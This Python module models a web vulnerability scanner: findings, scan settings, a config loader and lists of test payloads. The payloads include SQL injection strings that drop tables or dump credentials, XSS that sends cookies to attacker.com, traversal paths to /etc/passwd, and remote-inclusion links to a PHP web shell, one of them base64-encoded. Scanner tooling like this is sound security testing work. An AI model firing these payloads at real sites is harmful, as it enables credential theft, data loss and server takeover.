from dataclasses import dataclass
from typing import List, Dict, Optional
from enum import Enum
import json
import os

class VulnerabilityType(Enum):
    """Enumeration of vulnerability types"""
    SQL_INJECTION = "SQL Injection"
    XSS = "Cross-Site Scripting"
    CSRF = "Cross-Site Request Forgery"
    LFI = "Local File Inclusion"
    RFI = "Remote File Inclusion"
    OPEN_REDIRECT = "Open Redirect"
    SSRF = "Server-Side Request Forgery"
    XXE = "XML External Entity"
    COMMAND_INJECTION = "Command Injection"
    PATH_TRAVERSAL = "Path Traversal"

class RiskLevel(Enum):
    """Enumeration of risk levels"""
    LOW = "Low"
    MEDIUM = "Medium"
    HIGH = "High"
    CRITICAL = "Critical"

@dataclass
class Vulnerability:
    """Data class representing a vulnerability finding"""
    url: str
    vulnerability_type: VulnerabilityType
    risk_level: RiskLevel
    description: str
    payload: Optional[str] = None
    parameter: Optional[str] = None
    evidence: Optional[str] = None
    timestamp: Optional[str] = None
    
    def to_dict(self):
        """Convert to dictionary for JSON serialization"""
        return {
            'url': self.url,
            'vulnerability_type': self.vulnerability_type.value,
            'risk_level': self.risk_level.value,
            'description': self.description,
            'payload': self.payload,
            'parameter': self.parameter,
            'evidence': self.evidence,
            'timestamp': self.timestamp
        }

@dataclass
class ScanConfig:
    """Configuration for vulnerability scanning"""
    max_urls: int = 50
    delay: float = 1.0
    timeout: int = 10
    user_agent: str = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
    follow_redirects: bool = True
    verify_ssl: bool = False
    max_retries: int = 3
    
    def to_dict(self):
        """Convert to dictionary for JSON serialization"""
        return {
            'max_urls': self.max_urls,
            'delay': self.delay,
            'timeout': self.timeout,
            'user_agent': self.user_agent,
            'follow_redirects': self.follow_redirects,
            'verify_ssl': self.verify_ssl,
            'max_retries': self.max_retries
        }

@dataclass
class ScanResult:
    """Data class representing scan results"""
    target_url: str
    start_time: str
    end_time: str
    total_urls_discovered: int
    total_urls_tested: int
    vulnerabilities: List[Vulnerability]
    scan_config: ScanConfig
    
    def to_dict(self):
        """Convert to dictionary for JSON serialization"""
        return {
            'target_url': self.target_url,
            'start_time': self.start_time,
            'end_time': self.end_time,
            'total_urls_discovered': self.total_urls_discovered,
            'total_urls_tested': self.total_urls_tested,
            'vulnerabilities': [v.to_dict() for v in self.vulnerabilities],
            'scan_config': self.scan_config.to_dict()
        }
    
    def get_summary(self):
        """Get a summary of the scan results"""
        vuln_counts = {}
        for vuln in self.vulnerabilities:
            vuln_type = vuln.vulnerability_type.value
            if vuln_type not in vuln_counts:
                vuln_counts[vuln_type] = 0
            vuln_counts[vuln_type] += 1
        
        return {
            'total_vulnerabilities': len(self.vulnerabilities),
            'vulnerability_types': vuln_counts,
            'scan_duration': f"{self.start_time} to {self.end_time}",
            'coverage': f"{self.total_urls_tested}/{self.total_urls_discovered} URLs tested"
        }

class PayloadManager:
    """Manages vulnerability testing payloads"""
    
    def __init__(self):
        self.sqli_payloads = [
            "' OR '1'='1",
            "' OR 1=1--",
            "'; DROP TABLE users--",
            "' UNION SELECT NULL--",
            "' AND 1=1--",
            "1' OR '1'='1'--",
            "1' AND '1'='2",
            "admin'--",
            "admin'/*",
            "' OR 'x'='x",
            "' UNION SELECT username,password FROM users--",
            "' OR 1=1 LIMIT 1--",
            "' OR 1=1 ORDER BY 1--",
            "' OR 1=1 GROUP BY 1--",
            "' OR 1=1 HAVING 1=1--"
        ]
        
        self.xss_payloads = [
            "<script>alert('XSS')</script>",
            "<img src=x onerror=alert('XSS')>",
            "javascript:alert('XSS')",
            "<svg onload=alert('XSS')>",
            "'><script>alert('XSS')</script>",
            "<iframe src=javascript:alert('XSS')>",
            "<body onload=alert('XSS')>",
            "<input onfocus=alert('XSS') autofocus>",
            "<details open ontoggle=alert('XSS')>",
            "<video><source onerror=alert('XSS')>",
            "<script>fetch('http://attacker.com?cookie='+document.cookie)</script>",
            "<script>new Image().src='http://attacker.com?cookie='+document.cookie;</script>",
            "<script>eval(String.fromCharCode(97,108,101,114,116,40,39,88,83,83,39,41))</script>"
        ]
        
        self.lfi_payloads = [
            "../../../etc/passwd",
            "..\\..\\..\\windows\\system32\\drivers\\etc\\hosts",
            "....//....//....//etc/passwd",
            "..%2F..%2F..%2Fetc%2Fpasswd",
            "..%252F..%252F..%252Fetc%252Fpasswd"
        ]
        
        self.rfi_payloads = [
            "http://attacker.com/shell.txt",
            "http://attacker.com/shell.php",
            "ftp://attacker.com/shell.txt",
            "data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUW2NtZF0pOz8+"
        ]
    
    def get_payloads(self, vuln_type: VulnerabilityType) -> List[str]:
        """Get payloads for a specific vulnerability type"""
        if vuln_type == VulnerabilityType.SQL_INJECTION:
            return self.sqli_payloads
        elif vuln_type == VulnerabilityType.XSS:
            return self.xss_payloads
        elif vuln_type == VulnerabilityType.LFI:
            return self.lfi_payloads
        elif vuln_type == VulnerabilityType.RFI:
            return self.rfi_payloads
        else:
            return []

class ConfigManager:
    """Manages configuration files and settings"""
    
    def __init__(self, config_file: str = "config.json"):
        self.config_file = config_file
        self.default_config = {
            'scan': {
                'max_urls': 50,
                'delay': 1.0,
                'timeout': 10,
                'user_agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
                'follow_redirects': True,
                'verify_ssl': False,
                'max_retries': 3
            },
            'reporting': {
                'output_format': 'pdf',
                'include_evidence': True,
                'include_recommendations': True,
                'output_directory': 'reports'
            },
            'payloads': {
                'sql_injection': True,
                'xss': True,
                'lfi': False,
                'rfi': False,
                'csrf': False
            }
        }
    
    def load_config(self) -> Dict:
        """Load configuration from file"""
        if os.path.exists(self.config_file):
            try:
                with open(self.config_file, 'r') as f:
                    return json.load(f)
            except Exception as e:
                print(f"Error loading config: {e}")
                return self.default_config
        else:
            self.save_config(self.default_config)
            return self.default_config
    
    def save_config(self, config: Dict):
        """Save configuration to file"""
        try:
            with open(self.config_file, 'w') as f:
                json.dump(config, f, indent=4)
        except Exception as e:
            print(f"Error saving config: {e}")
    
    def get_scan_config(self) -> ScanConfig:
        """Get scan configuration"""
        config = self.load_config()
        scan_config = config.get('scan', {})
        return ScanConfig(**scan_config)

def create_vulnerability_from_dict(data: Dict) -> Vulnerability:
    """Create a Vulnerability object from dictionary"""
    return Vulnerability(
        url=data['url'],
        vulnerability_type=VulnerabilityType(data['vulnerability_type']),
        risk_level=RiskLevel(data['risk_level']),
        description=data['description'],
        payload=data.get('payload'),
        parameter=data.get('parameter'),
        evidence=data.get('evidence'),
        timestamp=data.get('timestamp')
    )

if __name__ == "__main__":
    # Test the models
    config_manager = ConfigManager()
    config = config_manager.load_config()
    print("Configuration loaded:", json.dumps(config, indent=2))
    
    payload_manager = PayloadManager()
    print(f"SQL Injection payloads: {len(payload_manager.get_payloads(VulnerabilityType.SQL_INJECTION))}")
    print(f"XSS payloads: {len(payload_manager.get_payloads(VulnerabilityType.XSS))}")
    
    # Test vulnerability creation
    vuln = Vulnerability(
        url="http://test.com/page.php?id=1",
        vulnerability_type=VulnerabilityType.SQL_INJECTION,
        risk_level=RiskLevel.HIGH,
        description="SQL injection found in id parameter",
        payload="' OR 1=1--",
        parameter="id"
    )
    print("Vulnerability created:", vuln.to_dict())
